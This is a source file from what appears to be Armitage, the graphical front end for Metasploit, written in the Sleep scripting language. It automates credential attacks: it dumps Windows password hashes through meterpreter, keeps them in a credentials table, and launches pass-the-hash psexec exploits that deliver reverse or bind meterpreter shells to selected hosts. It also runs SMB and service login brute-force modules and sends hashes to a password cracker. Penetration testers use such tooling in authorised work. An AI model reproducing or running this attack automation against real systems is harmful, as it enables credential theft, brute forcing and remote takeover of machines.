#
# pass the hash attack gets its own file.
#
import java.awt.*;
import java.awt.event.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

import msf.*;
import table.*;
import ui.*;

sub hashdump_callback {
	this('$host $safe $queue');

	if ($0 eq "begin" && "*Unknown command*hashdump*" iswm $2) {
		$host = $null;

		if ($safe is $null) {
			$safe = 1;
			m_cmd($1, "use priv");
			m_cmd_callback($1, "hashdump", $this);
			[$m append: "[*] stdapi/priv not loaded. Trying again\n"];
		}
		else {
			[$m append: "[-] hashdump is not available here\n"];	
			$safe = $null;
		}
	}
	else if ($0 eq "execute") {
		$host = sessionToHost($1);
		$queue = [new armitage.ConsoleQueue: $client];
		[$queue start];
		elog("dumped hashes on $host");
		[$m append: "[*] Dumping password hashes...\n"];
	}
	else if ($0 eq "update" && $host !is $null && $2 ismatch '(.*?):(\d+):([a-zA-Z0-9]+:[a-zA-Z0-9]+).*?') {
		local('$user $gid $hash');
		($user, $gid, $hash) = matched();

		# strip any funky characters that will cause this call to throw an exception
		$hash = fixPass($hash);

		if ($MSFVERSION >= 41000) {
			[$queue addCommand: $null, "creds add-ntlm ' $+ $user $+ ' $hash $+ \nversion"];
		}
		else {
			[$queue addCommand: $null, "creds -a $host -p 445 -t smb_hash -u ' $+ $user $+ ' -P $hash"];
		}
		[$m append: "[+] \t $+ $2 $+ \n"];
	}
	else if ($0 eq "end" && ("*Error running*" iswm $2 || "*Operation failed*" iswm $2)) {
		[$m append: "$2"];
		[$m append: "[-] hashdump failed. Ask yourself:\n\n1) Do I have system privileges?\n\nNo? Then use Access -> Escalate Privileges\n\n2) Is meterpreter running in a process owned\nby a System user?\n\nNo? Use Explore -> Show Processes and migrate\nto a process owned by a System user.\n\n"];

		[$queue stop];
		$host = $null;
	}
	else if ($0 eq "end" && $host !is $null) {
		[$queue stop];
	}
};

sub refreshCredsTable {
	fork({
		local('$creds $cred $desc $aclient %check $key');
		[$model clear: 128];
		foreach $desc => $aclient (convertAll([$__frame__ getClients])) {
			$creds = call($aclient, "db.creds2", [new HashMap])["creds2"];
			foreach $cred ($creds) {
				$key = join("~~", values($cred, @("user", "pass", "host")));
				if ($key in %check || isSSHKey($cred['ptype'])) {
				}
				else if ($title eq "login" && isHash($cred['ptype'], $cred['pass'])) {
				}
				else {
					[$model addEntry: $cred];
					%check[$key] = 1;
				}
			}
		}
		[$model fireListeners];
	}, $model => $1, $title => $2, \$__frame__);
}

sub isHash {
	# $2 = use regex to check if "password" is a hash.
	# this works around: https://dev.metasploit.com/redmine/issues/8841
	return iff($1 eq "smb_hash" || $1 eq "Metasploit::Credential::NTLMHash" || $2 ismatch '\w{32}:\w{32}');
}

sub isSSHKey {
	return iff($1 eq "ssh_key" || $1 eq "Metasploit::Credential::SSHKey");
}

sub isPassword {
	return iff($1 eq "password" || $1 eq "Metasploit::Credential::Password");
}

sub refreshCredsTableLocal {
	fork({
		local('$creds $cred $desc $aclient %check $key');
		[$model clear: 128];
		$creds = call($client, "db.creds2", [new HashMap])["creds2"];
		foreach $cred ($creds) {
			$key = join("~~", values($cred, @("user", "pass", "host")));
			if ($key in %check || isSSHKey($cred['ptype'])) {
			}
			else if ($title eq "login" && isHash($cred['ptype'], $cred['pass'])) {
				# we don't want hashes in normal login dialog
			}
			else {
				[$model addEntry: $cred];
				%check[$key] = 1;
			}
		}
		[$model fireListeners];
	}, $model => $1, $title => $2, \$client);
}

sub show_hashes {
	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $scroll $3');

	$dialog = dialog($1, 480, $2);

        $model = [new GenericTableModel: @("user", "pass", "host"), "user", 128];
 	
        $table = [new ATable: $model];
        $sorter = [new TableRowSorter: $model];
	[$sorter toggleSortOrder: 0];
	[$sorter setComparator: 2, &compareHosts];
        [$table setRowSorter: $sorter];

	if ($3) {
		refreshCredsTableLocal($model, $1);
	}
	else {
		refreshCredsTable($model, $1);
	}

	$scroll = [new JScrollPane: $table];
	[$scroll setPreferredSize: [new Dimension: 480, 130]];
	[$dialog add: $scroll, [BorderLayout CENTER]];

	return @($dialog, $table, $model);
}

sub createCredentialsTab {
	local('$dialog $table $model $panel $export $crack $refresh $import $copy');
	($dialog, $table, $model) = show_hashes("", 320, 1);
	[$dialog removeAll];

	addMouseListener($table, lambda({
		if ([$1 isPopupTrigger]) {
			local('$popup $entries');
			$popup = [new JPopupMenu];
			$entries = [$model getSelectedValuesFromColumns: $table, @("user", "pass", "host")];
			item($popup, "Delete", 'D', lambda({
				local('$queue $entry $user $pass $host');
				$queue = [new armitage.ConsoleQueue: $client];
				foreach $entry ($entries) {
					($user, $pass, $host) = $entry;
					$pass = fixPass($pass);
					[$queue addCommand: $null, "creds -d $host -u ' $+ $user $+ ' -P $pass"];
				}

				[$queue addCommand: "x", "creds -h"];

				[$queue addListener: lambda({
					[$queue stop];
					refreshCredsTable($model, $null);
				}, \$model, \$queue)];

				[$queue start];
				[$queue stop];
			}, \$table, \$model, \$entries));
			[$popup show: [$1 getSource], [$1 getX], [$1 getY]];
		}
	}, \$table, \$model));

	$panel = [new JPanel];
	[$panel setLayout: [new BorderLayout]];
	[$panel add: [new JScrollPane: $table], [BorderLayout CENTER]];

	$refresh = [new JButton: "Refresh"];
	[$refresh addActionListener: lambda({
		refreshCredsTableLocal($model, $null);
	}, \$model)];

	$copy = [new JButton: "Copy"];
	[$copy addActionListener: lambda({
		local('%r $entries $val $u $p');
		%r = ohash();
		$entries = [$model getSelectedValuesFromColumns: $table, @("user", "pass")];
		foreach $val ($entries) {
			($u, $p) = $val;
			%r["$u $p"] = 1;
		}
		setClipboard(join("\n", keys(%r)));
		showError("Copied selected creds to clipboard");
	}, \$model, \$table)];

	$crack = [new JButton: "Crack Passwords"];
	[$crack addActionListener: {
		thread({
			launch_dialog("Crack Passwords", "auxiliary", "analyze/jtr_crack_fast", 1);
		});
	}];

	$export = [new JButton: "Export"];
	[$export addActionListener: {
		[lambda({
			local('$file');
			saveFile2($this);
			yield;
			$file = $1;

			if ($client !is $mclient) {
				cmd_safe("db_export -f pwdump -a creds.export", lambda({
					downloadFile("creds.export", $file, {
						showError("Saved credentials");
					});
				}, \$file));
			}
			else {
				$file = strrep($file, '\\', '\\\\');
				cmd_safe("db_export -f pwdump -a $file", {
					showError("Saved credentials");
				});
			}
		})];
	}];

	$import = [new JButton: "Import"];
	[$import addActionListener: lambda({
		# I don't want to manage two data models for this dialog. We'll go with the
		# newest stuff.
		if ($MSFVERSION < 41000) {
			showError("This feature requires Metasploit 4.10 or later");
			return;
		}

		local('$dialog $label $text $finish $button');
		$dialog = dialog("Add Credentials", 320, 240);

		$label = [new JLabel: "Enter one username and password/line:"];
		$text = [new JTextArea];

		$finish = [new JPanel];
		[$finish setLayout: [new FlowLayout: [FlowLayout CENTER]]];
	
		$button = [new JButton: "Add"];
		[$finish add: $button];

		[$button addActionListener: lambda({
			local('$entry $user $pass $x $queue $all');
			$queue = [new armitage.ConsoleQueue: $client];

			# get our creds...
			$all = split("\n", [[$text getText] trim]);

			$x = 0;
			foreach $entry ($all) {
				($user, $pass) = split('\s+', ["$entry" trim]);
                                $pass = fixPass($pass);
				[$queue addCommand: $null, "creds add-password $user $pass $+ \nversion"];
				$x += 1;
                        }

			[$queue addCommand: "x", "creds -h"];
			[$queue addListener: lambda({
				[$queue stop];
				elog("added $x credential" . iff($x == 1, "", "s") . " to the database");
				showError("Added $x entr" . iff($x == 1, "y", "ies"));
				refreshCredsTable($model, $null);
			}, \$queue, \$model, \$x)];
			[$queue start];
			[$dialog setVisible: 0];
		}, \$text, \$dialog, \$model)];
	
		[$dialog add: $label, [BorderLayout NORTH]];
		[$dialog add: [new JScrollPane: $text], [BorderLayout CENTER]];
		[$dialog add: $finish, [BorderLayout SOUTH]];

		[$dialog setVisible: 1];
	}, \$model, \$dialog)];

	[$panel add: center($refresh, $copy, $crack, $import, $export), [BorderLayout SOUTH]];
	[$frame addTab: "Credentials", $panel, $null];
}

sub pass_the_hash {
	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $bottom $b2 $brute @controls');	

	($dialog, $table, $model) = show_hashes("Pass the Hash", 360);
	[[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];

	$bottom = [new JPanel];
	#[$bottom setLayout: [new GridLayout: 4, 1]];
	[$bottom setLayout: [new BoxLayout: $bottom, [BoxLayout Y_AXIS]]];

	$user = [new ATextField: 32];
	$pass = [new ATextField: 32];
	$domain = [new ATextField: 32];
	[$domain setText: "WORKGROUP"];
	$brute = [new JCheckBox: "Check all credentials"];

	$button = [new JButton: "Launch"];

	[[$table getSelectionModel] addListSelectionListener: lambda({
		[$user setText: [$model getSelectedValueFromColumn: $table, "user"]];
		[$pass setText: [$model getSelectedValueFromColumn: $table, "pass"]];
	}, \$table, \$model, \$user, \$pass)];

	$reverse = [new JCheckBox: "Use reverse connection"];

	@controls = @($user, $pass, $reverse);

	[$brute addActionListener: lambda({
		map(lambda({ [$1 setEnabled: $enable]; }, $enable => iff([$brute isSelected], 0, 1)), @controls);
	}, \$brute, \@controls)];

	[$bottom add: label_for("User", 75, $user)];
	[$bottom add: label_for("Pass", 75, $pass)];
	[$bottom add: label_for("Domain", 75, $domain)];
	[$bottom add: left($brute)];
	[$bottom add: left($reverse)];

	[$button addActionListener: lambda({
		local('$u $p %options $host $e $total');
		($e) = @_;

		%options["SMBDomain"] = [$domain getText];
		%options['RPORT']     = "445";
		%options["DB_ALL_CREDS"] = "false";
		
		if ([$brute isSelected]) {
			%options["RHOSTS"] = join(", ", $hosts);
			%options["BLANK_PASSWORDS"] = "false";
			%options["USER_AS_PASS"] = "false";
			createUserPassFile(convertAll([$model getRows]), "smb_hash", $this);
			yield;
			%options["USERPASS_FILE"] = $1;
			elog("brute force smb @ " . %options["RHOSTS"]);
			launchBruteForce("auxiliary", "scanner/smb/smb_login", %options, "brute smb");
		}
		else {
			%options["SMBUser"] = [$user getText];
			%options["SMBPass"] = [$pass getText];
			%options["LPORT"] = randomPort();
			$total = size($hosts);

			foreach $host ($hosts) {
				if ([$reverse isSelected]) {
					%options["LHOST"] = $MY_ADDRESS;
					%options["PAYLOAD"] = "windows/meterpreter/reverse_tcp";
					%options["LPORT"] = randomPort();
				}
				else if (isIPv6($host)) {
					%options["PAYLOAD"] = "windows/meterpreter/bind_ipv6_tcp";
				}
				else {
					%options["PAYLOAD"] = "windows/meterpreter/bind_tcp";
				}
				%options["RHOST"] = $host;
				module_execute("exploit", $module, copy(%options), $total);
			}

			elog("psexec: " . [$user getText] . ":" . [$pass getText] . " @ " . join(", ", $hosts));

			if ($total >= 4) {
				showError("Launched $module at $total hosts");
			}
		}

		if (!isShift($e)) {
			[$dialog setVisible: 0];
		}
	}, \$dialog, \$user, \$domain, \$pass, \$reverse, \$hosts, \$brute, \$model, \$module)];

	$b2 = [new JPanel];
	[$b2 setLayout: [new BorderLayout]];
	[$b2 add: $bottom, [BorderLayout NORTH]];
	[$b2 add: center($button), [BorderLayout SOUTH]];

	[$dialog add: $b2, [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}


sub show_login_dialog {
	this('$module'); # should be $null by default!

	local('$port $srvc');
	($port, $srvc) = values($service, @("port", "name"));

	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $bottom $b2 $brute @controls $scroll');

	($dialog, $table, $model) = show_hashes("login", 320);
	[[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];

	$bottom = [new JPanel];
	[$bottom setLayout: [new GridLayout: 3, 1]];

	$user = [new ATextField: 32];
	$pass = [new ATextField: 32];
	$brute = [new JCheckBox: "Check all credentials"];
	@controls = @($user, $pass);

	$button = [new JButton: "Launch"];

	[[$table getSelectionModel] addListSelectionListener: lambda({
		[$user setText: [$model getSelectedValueFromColumn: $table, "user"]];
		[$pass setText: [$model getSelectedValueFromColumn: $table, "pass"]];
	}, \$table, \$model, \$user, \$pass)];

	[$bottom add: label_for("User", 75, $user)];
	[$bottom add: label_for("Pass", 75, $pass)];
	[$bottom add: $brute];

	[$brute addActionListener: lambda({
		map(lambda({ [$1 setEnabled: $enable]; }, $enable => iff([$brute isSelected], 0, 1)), @controls);
	}, \$brute, \@controls)];

	if ($module is $null) {
		$module = "scanner/ $+ $srvc $+ / $+ $srvc $+ _login";
	}

	[$button addActionListener: lambda({
		local('$u $p %options $host $e');
		($e) = @_;

		%options["RHOSTS"] = join(', ', $hosts);
		%options["RPORT"] = $port;
		%options["DB_ALL_CREDS"] = "false";

		if ([$brute isSelected]) {
			%options["BLANK_PASSWORDS"] = "false";
			%options["USER_AS_PASS"] = "false";
			createUserPassFile(convertAll([$model getRows]), $null, $this);
			yield;
			%options["USERPASS_FILE"] = $1;
			elog("brute force $srvc @ " . %options["RHOSTS"]);
			launchBruteForce("auxiliary", $module, %options, "brute $srvc");
		}
		else {
			%options["USERNAME"] = [$user getText];
			%options["PASSWORD"] = [$pass getText];
			%options["BLANK_PASSWORDS"] = "false";
			%options["USER_AS_PASS"] = "false";
			print_info("$srvc $+ : $port => " . %options);
			elog("login $srvc with " . [$user getText] . ":" . [$pass getText] . " @ " . %options["RHOSTS"]);
			module_execute("auxiliary", $module, %options);
		}
		if (!isShift($e)) {
			[$dialog setVisible: 0];
		}
	}, \$dialog, \$user, \$pass, \$hosts, \$srvc, \$port, \$brute, \$model, \$module)];

	$b2 = [new JPanel];
	[$b2 setLayout: [new BorderLayout]];
	[$b2 add: $bottom, [BorderLayout NORTH]];
	[$b2 add: center($button), [BorderLayout SOUTH]];

	$scroll = [new JScrollPane: $table];
	[$scroll setPreferredSize: [new Dimension: 480, 130]];
	[$dialog add: $scroll, [BorderLayout CENTER]];
	[$dialog add: $b2, [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub createUserPassFile {
	local('$handle $user $pass $type $row $name %entries');

	$name = "userpass" . rand(10000) . ".txt";

	# loop through our entries and store them
	%entries = ohash();
	foreach $row ($1) {
		($user, $pass, $type) = values($row, @("user", "pass", "ptype"));
		if (isPassword($type)) {
			%entries["$user $pass"] = "$user $pass";
		}
		else if ($2 eq "smb_hash" && isHash($type, $pass)) {
			%entries["$user $pass"] = "$user $pass";
		}
		else {
			%entries[$user] = $user;
		}
	}	

	# print out unique entry values
	$handle = openf("> $+ $name");
	printAll($handle, values(%entries));
	closef($handle);

	if ($client !is $mclient) {
		uploadBigFile($name, lambda({
			[$cb: $1];
		}, $cb => $3));
		deleteOnExit($name);
	}
	else {
		# has to happen async in a local context
		thread(lambda({
			[$cb: getFileProper($name)];
		}, $cb => $3, \$name));
		deleteOnExit(getFileProper($name));
	}
}

# launchBruteForce("auxiliary", "scanner/ $+ $srvc $+ / $+ $srvc $+ _login", %options);
sub launchBruteForce {
	thread(lambda({ 
		local('$console $key $value');
		$console = createDisplayTab("$title", $host => "all", $file => "brute_login");
		[$console addCommand: $null, "use $type $+ / $+ $module"];
		foreach $key => $value ($options) {
			$value = strrep($value, '\\', '\\\\');
		}
		$options['REMOVE_USERPASS_FILE'] = "true";
		[$console setOptions: $options];
		[$console addCommand: $null, "run -j"];
		[$console start];
	}, $type => $1, $module => $2, $options => $3, $title => $4));
}

sub credentialHelper {
	fork({ 
		# gather our credentials please
		local('$creds $cred @creds $desc $aclient $key %check');
		foreach $desc => $aclient (convertAll([$__frame__ getClients])) {
			$creds = call($aclient, "db.creds2", [new HashMap])["creds2"];
			foreach $cred ($creds) {
				$key = join("~~", values($cred, @("user", "pass", "host")));
				if ($key in %check || isSSHKey($cred['ptype'])) {
					# we don't want duplicate entries and we don't want SSH keys
				}
				else if ($PASS ne "SMBPass" && isHash($cred['ptype'], $cred['pass'])) {
					# don't show hashes when pass type isn't SMBPass
				}
				else {
					push(@creds, $cred);
					%check[$key] = 1;
				}
			}
		}

		# pop up a dialog to let the user choose their favorite set
		quickListDialog("Choose credentials", "Select", @("user", "user", "pass", "host"), @creds, $width => 640, $height => 240, lambda({
			if ($1 eq "") {
				return;
			}

			local('$user $pass');
			$user = [$3 getSelectedValueFromColumn: $2, 'user'];
			$pass = [$3 getSelectedValueFromColumn: $2, 'pass'];

			[$model setValueForKey: $USER, "Value", $user];
			[$model setValueForKey: $PASS, "Value", $pass];
			[$model fireListeners];
		}, \$model, \$USER, \$PASS));
	}, \$USER, \$PASS, \$model, \$mclient, \$__frame__);
}

